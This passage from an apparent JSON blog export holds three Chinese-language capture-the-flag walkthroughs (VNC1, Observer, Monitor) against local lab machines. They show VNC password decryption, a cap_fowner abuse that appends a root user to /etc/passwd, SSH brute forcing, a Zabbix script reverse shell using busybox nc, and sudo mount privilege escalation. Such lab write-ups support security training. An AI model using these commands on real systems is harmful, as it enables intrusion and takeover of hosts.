\u7684\u5bb6\u76ee\u5f55\u4e0b\u53d1\u73b0\u4e86\u4e00\u4e2a\u5168\u5c40\u53ef\u8bfb\u7684VNC\u5bc6\u7801\u5907\u4efd\u6587\u4ef6\u3002\n\n```bash\nwww-data@VNC1:/home/todd/.vnc$ ls -al\n...\n-rw-r--r--  1 root root      8 Jul 28 22:05 passwd.bak\n...\nwww-data@VNC1:/home/todd/.vnc$ base64 passwd.bak \nQMypcY/7jpE=\n```\n\n\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u9519\u8bef\u914d\u7f6e\u3002\u6211\u4eec\u5c06\u8fd9\u4e2aBase64\u7f16\u7801\u7684\u5bc6\u7801\u54c8\u5e0c\u590d\u5236\u5230\u672c\u5730\u8fdb\u884c\u7834\u89e3\u3002\u6211\u4eec\u4f7f\u7528 `vncpwd` \u5de5\u5177\uff0c\u8be5\u5de5\u5177\u4e13\u95e8\u7528\u4e8e\u89e3\u5bc6\u8fd9\u7c7bVNC\u5bc6\u7801\u6587\u4ef6\u3002\n\n**\u5728Kali\u4e0a\u7834\u89e3VNC\u5bc6\u7801:**\n\n```bash\n# \u514b\u9686\u5e76\u7f16\u8bd1\u5de5\u5177\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ git clone https://github.com/jeroennijhof/vncpwd.git\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd vncpwd && make\n\n# \u5c06\u4ece\u76ee\u6807\u673a\u83b7\u53d6\u7684base64\u5b57\u7b26\u4e32\u89e3\u7801\u56de\u6587\u4ef6\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/vncpwd]\n\u2514\u2500$ echo 'QMypcY/7jpE=' |base64 -d > passwd\n\n# \u6267\u884c\u89e3\u5bc6\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/vncpwd]\n\u2514\u2500$ ./vncpwd passwd                        \nPassword: vncpassw\n```\n\n\u6210\u529f\u89e3\u5bc6\u51faVNC\u5bc6\u7801\u4e3a `vncpassw`\u3002\u4f7f\u7528 `vncviewer` \u548c\u6b64\u5bc6\u7801\u8fde\u63a5\u5230\u76ee\u6807\u76845901\u7aef\u53e3\uff08\u8fd9\u91cc\u9700\u8981\u56fe\u5f62\u5316\u684c\u9762\uff09\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ vncviewer 192.168.205.140:1\n...\nPassword: vncpassw\nAuthentication successful\n...\n```\n\n\u6210\u529f\u767b\u5f55\uff0c\u83b7\u53d6 `todd` \u7528\u6237\u7684\u56fe\u5f62\u5316\u684c\u9762\u4f1a\u8bdd\u3002\u5728\u8be5\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230\u7b2c\u4e00\u4e2aflag\u3002\n\n```bash\nwww-data@VNC1:/home/todd$ cat user.txt \n12f54a96f64443246930da001cafda8b\n```\n\n## **2. todd -> root (\u5782\u76f4\u63d0\u6743)**\n\n\u5728 `todd` \u7528\u6237\u7684\u4f1a\u8bdd\u4e2d\u8fdb\u884c\u63d0\u6743\u4fe1\u606f\u641c\u96c6\u3002\u9996\u5148\u68c0\u67e5\u6587\u4ef6\u7684\u7279\u6b8a\u80fd\u529b\uff08Capabilities\uff09\u3002\n\n```bash\ntodd@VNC1:~$ getcap -r / 2>/dev/null\n...\n/home/todd/Videos/python3.9 = cap_fowner+ep\n```\n\n\u53d1\u73b0\u4e00\u4e2a\u4f4d\u4e8e\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u7684 `python3.9` \u53ef\u6267\u884c\u6587\u4ef6\u88ab\u8d4b\u4e88\u4e86 `cap_fowner` \u80fd\u529b\u3002\u8be5\u80fd\u529b\u5141\u8bb8\u8fdb\u7a0b**\u65e0\u89c6\u6587\u4ef6\u6743\u9650**\uff0c\u66f4\u6539\u6587\u4ef6\u7684\u6240\u6709\u8005\u548c**\u6743\u9650**\u3002\n\n\u76f4\u63a5\u5229\u7528\u8be5\u80fd\u529b `setuid(0)` \u7684\u5c1d\u8bd5\u5931\u8d25\u4e86\u3002\n\n```bash\ntodd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.setuid(0); os.system('/bin/sh')'\nPermissionError: [Errno 1] Operation not permitted\n```\n\n\u4f46\u662f\uff0c`chmod` \u64cd\u4f5c\u5e76\u672a\u88ab\u9650\u5236\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u80fd\u529b\u5c06 `/etc/passwd` \u6587\u4ef6\u53d8\u4e3a\u5168\u5c40\u53ef\u5199\uff0c\u7136\u540e\u6dfb\u52a0\u4e00\u4e2aUID\u4e3a0\u7684\u65b0\u7528\u6237\u6765\u5b9e\u73b0\u63d0\u6743\u3002\n\n**\u5229\u7528`cap_fowner`\u4fee\u6539`/etc/passwd`\u6743\u9650:**\n\n```bash\ntodd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.chmod('/etc/passwd', 0o777)'\ntodd@VNC1:~$ ls -al /etc/passwd\n-rwxrwxrwx 1 root root 1853 Jul 28 10:17 /etc/passwd\n```\n\n\u6210\u529f\u4fee\u6539\u6743\u9650\u3002\u73b0\u5728\uff0c\u6211\u4eec\u5411 `/etc/passwd` \u6587\u4ef6\u4e2d\u8ffd\u52a0\u4e00\u4e2a\u65b0\u7528\u6237 `b`\uff0c\u5176UID\u548cGID\u5747\u4e3a0\uff0c\u5bc6\u7801\u4e3a `abcdefg` (\u4f7f\u7528`$1$`\u7684MD5\u54c8\u5e0c)\u3002\n\n```bash\ntodd@VNC1:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' >> /etc/passwd\n```\n\n**\u5207\u6362\u7528\u6237\u5e76\u83b7\u53d6\u6700\u7ec8Flag:**\n\n```bash\ntodd@VNC1:~$ su b\nPassword: abcdefg\nroot@VNC1:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@VNC1:~# cat /root/root.txt /home/todd/user.txt \nflag{root-60b725f10c9c85c70d97880dfe8191b3}\n12f54a96f64443246930da001cafda8b\n```\n\n\u81f3\u6b64\uff0c\u6210\u529f\u83b7\u53d6root\u6743\u9650\uff0c\u9776\u673a\u5b8c\u5168\u653b\u7834\u3002sentence", "top": 0, "createdAt": 1754748252, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-09", "dateLabelColor": "#0969da"}, "P201": {"htmlDir": "docs/post/vulnyx_Observer.html", "labels": ["vulnyx"], "postTitle": "vulnyx_Observer", "postUrl": "post/vulnyx_Observer.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/201", "commentNum": 0, "wordCount": 4242, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528`arp-scan`\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:e7:c9:11       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u8ba4\u76ee\u6807\u4e3b\u673aIP\u5730\u5740\u4e3a `192.168.205.131`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\u548c\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- -A 192.168.205.131           \nStarting Nmap 7.95 ( https://nmap.org )\n...\nNmap scan report for 192.168.205.131\nHost is up (0.00015s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\nMAC Address: 08:00:27:E7:C9:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u4e24\u4e2a\u7aef\u53e3\u3002\n\n# \u4e8c\u3001Web\u6e17\u900f\n\n## 1. \u865a\u62df\u4e3b\u673a\u53d1\u73b0\n\n\u76f4\u63a5\u8bbf\u95ee `http://192.168.205.131` \u663e\u793a\u7684\u662f Apache \u7684\u9ed8\u8ba4\u9875\u9762\u3002\u901a\u8fc7\u76ee\u5f55\u7206\u7834\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e9b\u76ee\u5f55\u4fe1\u606f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64  \n...\n/index.html           (Status: 200) [Size: 35742]\n/images               (Status: 301) [Size: 319] [--> http://192.168.205.131/images/]\n/css                  (Status: 301) [Size: 316] [--> http://192.168.205.131/css/]\n/js                   (Status: 301) [Size: 315] [--> http://192.168.205.131/js/]\n/fonts                (Status: 301) [Size: 318] [--> http://192.168.205.131/fonts/]\n...\n```\n\n\u901a\u8fc7\u67e5\u770b`/image`\u4e2d\u7684\u56fe\u7247\u6587\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u4ed6\u4f7f\u7528\u7684\u56fe\u7247\u5185\u5bb9\u8c8c\u4f3c\u662fweb\u7f51\u7ad9\u6a21\u677f\u7684\u56fe\u7247\uff0c\u6240\u4ee5\u731c\u6d4b\u53ef\u80fd\u5b58\u5728\u57df\u540d\u3002\u5c06\u57df\u540d `Observer.nlx` \u7ed1\u5b9a\u5230IP\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo vim /etc/hosts\n\n# \u5728\u6587\u4ef6\u672b\u5c3e\u6dfb\u52a0\n192.168.205.131 Observer.nlx\n```\n\n## 2. Web\u4fe1\u606f\u679a\u4e3e\n\n\u8bbf\u95ee `http://Observer.nlx`\uff0c\u7f51\u7ad9\u662f\u4e00\u4e2a\u9759\u6001\u7684\u7f51\u9875\u6a21\u677f\u3002\u5728\u5bf9\u7f51\u7ad9\u76ee\u5f55\u8fdb\u884c\u7206\u7834\u540e\u672a\u53d1\u73b0\u654f\u611f\u6587\u4ef6\uff0c\u4f46\u5728\u4e3b\u9875`index.html`\u7684\u6e90\u7801\u4e2d\uff0c\u201cOur Team\u201d\u90e8\u5206\u53d1\u73b0\u4e86\u51e0\u4e2a\u53ef\u7591\u7684\u7528\u6237\u540d\u3002\n\n\n![image-20250810130421280](http://7r1UMPHK.github.io/image/20250810130421538.webp)\n\n\u4ece\u6e90\u7801\u4e2d\uff0c\u6211\u4eec\u63d0\u53d6\u5230\u4ee5\u4e0b\u6f5c\u5728\u7528\u6237\u540d\uff1a\n*   **john**\n*   **mike**\n*   **remo**\n*   **niscal**\n\n# \u4e09\u3001\u4e3b\u673a\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9\n\n## 1. SSH\u7206\u7834\n\n\u5229\u7528\u4e0a\u4e00\u6b65\u53d1\u73b0\u7684\u7528\u6237\u540d\u5217\u8868\uff0c\u7ed3\u5408\u5f31\u53e3\u4ee4\u5b57\u5178\uff0c\u5bf9SSH\u670d\u52a1\u8fdb\u884c\u7206\u7834\u653b\u51fb\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat user.txt\njohn\nmike\nremo\nniscal\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ hydra -L user.txt -P /path/to/passwords.txt ssh://192.168.205.131 -t 64\n...\n[22][ssh] host: 192.168.205.131   login: niscal   password: niscal\n...\n```\n\n\u6210\u529f\u7206\u7834\u51fa\u7528\u6237 `niscal` \u7684\u5bc6\u7801\u4e3a `niscal`\u3002\n\n## 2. \u53d7\u9650Shell\u7ed5\u8fc7\n\n\u5c1d\u8bd5\u4f7f\u7528\u83b7\u53d6\u7684\u51ed\u8bc1\u767b\u5f55SSH\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh niscal@192.168.205.131\nniscal@192.168.205.131's password: \n\n########################################\n# Dear person,                         #\n# Not now! I'm busy with the terminal. #\n# by Niscal                            #\n########################################\n\nConnection to 192.168.205.131 closed.\n```\n\n\u767b\u5f55\u540e\u8fde\u63a5\u7acb\u5373\u88ab\u5173\u95ed\uff0c\u5e76\u663e\u793a\u4e00\u6761\u5173\u952e\u4fe1\u606f **'I'm busy with the terminal.'**\u3002\u8fd9\u5f3a\u70c8\u6697\u793a\u5f53\u524d\u767b\u5f55\u7684\u4f1a\u8bdd\u4e0d\u88ab\u8ba4\u4e3a\u662f\u201c\u771f\u6b63\u7684\u7ec8\u7aef\u201d\uff0c\u56e0\u6b64\u88ab\u9650\u5236\u811a\u672c\u62d2\u7edd\u3002\n\n## 3. X11\u8f6c\u53d1\u653b\u51fb\n\n\u6839\u636e\u63d0\u793a\uff0c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528SSH\u7684X11\u8f6c\u53d1\u529f\u80fd (`-X` \u6216 `-Y`) \u6765\u8bf7\u6c42\u4e00\u4e2a\u56fe\u5f62\u5316\u4f1a\u8bdd\uff0c\u8fd9\u5f88\u53ef\u80fd\u7ed5\u8fc7\u9650\u5236\u811a\u672c\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh -X niscal@192.168.205.131 \nniscal@192.168.205.131's password: \n...\n```\n\n![image-20250810125226283](http://7r1UMPHK.github.io/image/20250810125233587.webp)\n\n\u6210\u529f\u663e\u793a\uff0c\u5e76\u4e14\u663e\u793a\u4e86\u4e0b\u9762\u5185\u5bb9\u3002\n\n```\nniscal@observer:~$ echo -n REMOisGOD | passwd remo\n```\n\n\u7ecf\u8fc7\u5c1d\u8bd5\u8be5X11 shell\u5728\u8f93\u5165\u547d\u4ee4\u56de\u8f66\u5c31\u4f1a\u65ad\u5f00\u3002\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u6a2a\u5411\u79fb\u52a8 (niscal -> remo)\n\n\u4f7f\u7528\u663e\u793a\u7684\u7528\u6237\u540d`remo`\u548c\u5bc6\u7801`REMOisGOD`\u8fdb\u884c\u767b\u5f55\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh remo@192.168.205.131\nremo@192.168.205.131's password: \n...\nremo@observer:~$ id\nuid=1001(remo) gid=1001(remo) groups=1001(remo)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `remo` \u7528\u6237\u3002\n\n## 2. \u63d0\u6743\u81f3root\n\n\u5728 `remo` \u7528\u6237\u4e0b\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u68c0\u67e5\u73af\u5883\u53d8\u91cf\u65f6\u53d1\u73b0\u4e86\u4e00\u4e2a\u91cd\u5927\u7ebf\u7d22\u3002\n\n```bash\nremo@observer:~$ env\n...\nrootKEY=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... (\u6b64\u5904\u7701\u7565\u4e86\u8d85\u957f\u7684Base64\u5b57\u7b26\u4e32)\n...\n```\n\n\u73af\u5883\u53d8\u91cf `rootKEY` \u5305\u542b\u4e00\u4e2aBase64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff0c\u770b\u8d77\u6765\u50cf\u662f\u4e00\u4e2aSSH\u79c1\u94a5\u3002\u6211\u4eec\u5c06\u5176\u89e3\u7801\u5e76\u4fdd\u5b58\u3002\n\n```bash\nremo@observer:~$ echo 'LS0tLS1...LS0tCg==' | base64 -d > id_rsa\nremo@observer:~$ chmod 600 id_rsa\n```\n\n\u4f7f\u7528\u8fd9\u4e2a\u79c1\u94a5\u5c1d\u8bd5\u4ee5 `root` \u7528\u6237\u8eab\u4efd\u767b\u5f55\u672c\u5730SSH\u670d\u52a1\u3002\n\n```bash\nremo@observer:~$ ssh root@127.0.0.1 -i id_rsa\nWarning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.\nroot@observer:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u63d0\u6743\u81f3 `root` \u7528\u6237\uff01\n\n# \u4e94\u3001\u83b7\u53d6Flag\n\n\u73b0\u5728\u6211\u4eec\u62e5\u6709\u4e86\u6240\u6709\u6743\u9650\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709\u7684Flag\u3002\n\n```bash\nroot@observer:~# cat /root/root.txt\nfa40a17de09827a5ae20a894304c6a49\n\nroot@observer:~# cat /home/remo/user.txt \nf2edafebb9851d806ff15deb0477ebe8\n```\n\n\u6240\u6709Flag\u5747\u5df2\u627e\u5230\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754802937, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-10", "dateLabelColor": "#0969da"}, "P203": {"htmlDir": "docs/post/nei-bu-_Monitor.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Monitor", "postUrl": "post/nei-bu-_Monitor.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/203", "commentNum": 0, "wordCount": 3899, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.141 08:00:27:b0:33:ee       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u8ba4\u76ee\u6807\u4e3b\u673aIP\u5730\u5740\u4e3a `192.168.205.141`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\u548c\u670d\u52a1\u7248\u672c\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.141\n...\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n111/tcp   open  rpcbind\n2049/tcp  open  nfs\n10050/tcp open  zabbix-agent\n10051/tcp open  zabbix-trapper\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u5f00\u653e\u4e86\u591a\u4e2a\u7aef\u53e3\uff0c\u5305\u62ec **22 (SSH)**, **80 (HTTP)**, \u4ee5\u53ca\u4e0eZabbix\u76d1\u63a7\u670d\u52a1\u76f8\u5173\u7684 **10050** \u548c **10051** \u7aef\u53e3\u3002\n\n# \u4e8c\u3001Web\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9\n\n## 1. Web\u670d\u52a1\u63a2\u67e5\n\n\u8bbf\u95ee\u76ee\u6807 `http://192.168.205.141`\uff0c\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a\u201c\u76d1\u63a7\u7cfb\u7edf\u767b\u5f55\u201d\u754c\u9762\u3002\u5c1d\u8bd5\u4f7f\u7528\u5e38\u89c1\u7684\u5f31\u53e3\u4ee4 `admin:admin` \u8fdb\u884c\u767b\u5f55\uff0c\u8bf7\u6c42\u6210\u529f\u540e\u88ab\u91cd\u5b9a\u5411\u5230 `dashboard.php`\uff0c\u767b\u5f55\u540e\u8fdb\u5165\u4e00\u4e2a\u901a\u7528\u7684\u4eea\u8868\u677f\u9875\u9762\uff0c\u672a\u53d1\u73b0\u53ef\u5229\u7528\u7684\u529f\u80fd\u70b9\u6216\u4fe1\u606f\u6cc4\u9732\u3002\n\n\u968f\u540e\uff0c\u4f7f\u7528`gobuster`\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u8def\u5f84 `/zabbix/`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.141 ...\n...\n/zabbix (Status: 301) [Size: 319] [--> http://192.168.205.141/zabbix/]\n...\n```\n\n## 2. Zabbix RCE (\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c)\n\n\u9488\u5bf9\u53d1\u73b0\u7684 `/zabbix` \u8def\u5f84\uff0c\u4f7f\u7528`nuclei`\u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728Zabbix\u9ed8\u8ba4\u51ed\u8bc1\u6f0f\u6d1e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nuclei -u http://192.168.205.141/zabbix/\n...\n[zabbix-default-login] [http] [high] http://192.168.205.141/zabbix/index.php [password='zabbix',path='/index.php',username='Admin']\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u63d0\u793a\u9ed8\u8ba4\u7528\u6237\u540d\u4e3a `Admin`\uff0c\u5bc6\u7801\u4e3a `zabbix`\u3002\n\n\u4f7f\u7528\u8be5\u51ed\u8bc1\u767b\u5f55Zabbix\u7cfb\u7edf\u3002Zabbix\u63d0\u4f9b\u4e86\u521b\u5efa\u548c\u6267\u884c\u811a\u672c\u7684\u529f\u80fd\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u529f\u80fd\u83b7\u53d6\u53cd\u5f39shell\u3002\n\n1. **\u521b\u5efa\u811a\u672c**: \u5bfc\u822a\u5230 `Administration` > `Scripts`\uff0c\u70b9\u51fb `Create script`\u3002\n\n2. **\u914d\u7f6e\u811a\u672c**:\n\n   *   **Name**: `shell`\n   *   **Scope**:`Manual host action`\n   *   **Type**:`Script`\n   *   **Execute on**:`Zabbix server`\n   *   **Commands**: `busybox nc 192.168.205.128 8888 -e /bin/bash`\n\n   *ps:\u5efa\u8bae\u8fdb\u53bbshell\u4e4b\u540e\u5199\u4e00\u4e2a\u811a\u672c\u518d\u6267\u884c\u4e00\u904d\u53cd\u5f39\uff0c\u4e0d\u7136\u7684\u8bdd\uff0c\u4ed6\u7684\u811a\u672c\u4efb\u52a1\u4e00\u7ed3\u675f\u5c31\u4f1a\u65ad\u5f00\uff0c\u5927\u7ea65min\u5de6\u53f3*\n\n3. **\u6267\u884c\u811a\u672c**: \u5bfc\u822a\u5230 `Monitoring` > `Hosts`\uff0c\u9009\u62e9\u76ee\u6807\u4e3b\u673a\uff0c\u7136\u540e\u4ece\u811a\u672c\u4e0b\u62c9\u83dc\u5355\u4e2d\u9009\u62e9\u5e76\u6267\u884c\u521a\u521a\u521b\u5efa\u7684 `shell` \u811a\u672c\u3002\n\n![image-20250810205337566](http://7r1UMPHK.github.io/image/20250810205337820.webp)\n\n\u5728Kali\u4e0a\u8bbe\u7f6e`netcat`\u76d1\u542c\uff0c\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.141] 55914\nid\nuid=107(zabbix) gid=114(zabbix) groups=114(zabbix)\n```\n\n\u4e3a\u65b9\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u5bf9\u83b7\u53d6\u7684\u975e\u4ea4\u4e92\u5f0fshell\u8fdb\u884c\u7a33\u5b9a\u5316\u5904\u7406\u3002\n\n```bash\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\n```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u6a2a\u5411\u79fb\u52a8 (zabbix -> hyh)\n\n\u5728`zabbix`\u7528\u6237\u6743\u9650\u4e0b\uff0c\u5bfb\u627e\u914d\u7f6e\u6587\u4ef6\u4ee5\u83b7\u53d6\u66f4\u591a\u51ed\u8bc1\u4fe1\u606f\u3002Zabbix\u7684Web\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u5305\u542b\u4e86\u6570\u636e\u5e93\u7684\u8fde\u63a5\u4fe1\u606f\u3002\n\n```bash\nzabbix@Monitor:/$ find / -name 'zabbix.conf.php' 2>/dev/null\n/usr/share/zabbix/conf/zabbix.conf.php\nzabbix@Monitor:/$ cat /usr/share/zabbix/conf/zabbix.conf.php\n<?php\n// Zabbix GUI configuration file.\n$DB['TYPE']                             = 'MYSQL';\n$DB['SERVER']                   = 'localhost';\n$DB['DATABASE']                 = 'zabbix';\n$DB['USER']                             = 'zabbix';\n$DB['PASSWORD']                 = 'root123';\n...\n?>\n```\n\n\u4ece\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u83b7\u5f97\u4e86\u6570\u636e\u5e93\u7528\u6237`zabbix`\u7684\u5bc6\u7801`root123`\u3002\u901a\u8fc7`ls /home`\u53d1\u73b0\u5b58\u5728\u53e6\u4e00\u4e2a\u7528\u6237`hyh`\u3002\u5c1d\u8bd5\u4f7f\u7528\u6b64\u5bc6\u7801\u5207\u6362\u5230`hyh`\u7528\u6237\u3002\n\n```bash\nzabbix@Monitor:/$ su hyh\nPassword: root123\nhyh@Monitor:~$ id\nuid=1002(hyh) gid=1002(hyh) groups=1002(hyh)\n```\n\n\u6210\u529f\u5207\u6362\u5230`hyh`\u7528\u6237\uff0c\u5e76\u5728\u5176\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230`user.txt`\u3002\n\n## 2. \u63d0\u6743\u81f3root\n\n\u5728`hyh`\u7528\u6237\u4e0b\uff0c\u4f7f\u7528`sudo -l`\u68c0\u67e5\u5176sudo\u6743\u9650\u3002\n\n```bash\nhyh@Monitor:~$ sudo -l\n...\nUser hyh may run the following commands on Monitor:\n    (ALL) NOPASSWD: /usr/bin/mount\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c`hyh`\u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c`/usr/bin/mount`\u547d\u4ee4\u3002\u67e5\u8be2**GTFOBins**\u53ef\u77e5\uff0c\u53ef\u4ee5\u5229\u7528`mount`\u7684`bind`\u9009\u9879\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\n\n>https://gtfobins.github.io/gtfobins/mount/\n\n\u6211\u4eec\u5c06`/bin/bash`\u901a\u8fc7`bind`\u7684\u65b9\u5f0f\u6302\u8f7d\u5230`/bin/mount`\u4e0a\uff0c\u7136\u540e\u901a\u8fc7`sudo`\u6267\u884c`mount`\uff0c\u6b64\u65f6\u6267\u884c\u7684\u5c06\u662f\u62e5\u6709root\u6743\u9650\u7684bash\u3002\n\n```bash\nhyh@Monitor:~$ sudo mount -o bind /bin/bash /bin/mount\nhyh@Monitor:~$ sudo mount\nroot@Monitor:/home/hyh# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u83b7\u5f97root\u6743\u9650\u3002\n\n# \u56db\u3001\u83b7\u53d6Flag\n\n\u73b0\u5728\u6211\u4eec\u62e5\u6709\u4e86root\u6743\u9650\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709\u7684Flag\u3002\n\n```bash\nroot@Monitor:~# cat /root/root.txt\nflag{root-deb15d884e04de6f6972b3c25e3cc11b}\n\nroot@Monitor:~# cat /home/hyh/user.txt \nflag{user-ab0e0561b1a833a6141ad2273744543c}\n```\n\n\u6240\u6709Flag\u5747\u5df2\u627e\u5230\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754839172, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-10", "dateLabelColor": "#0969da"}, "P204": {"htmlDir": "docs/post/nei-bu-_hoshi.html", "labels": 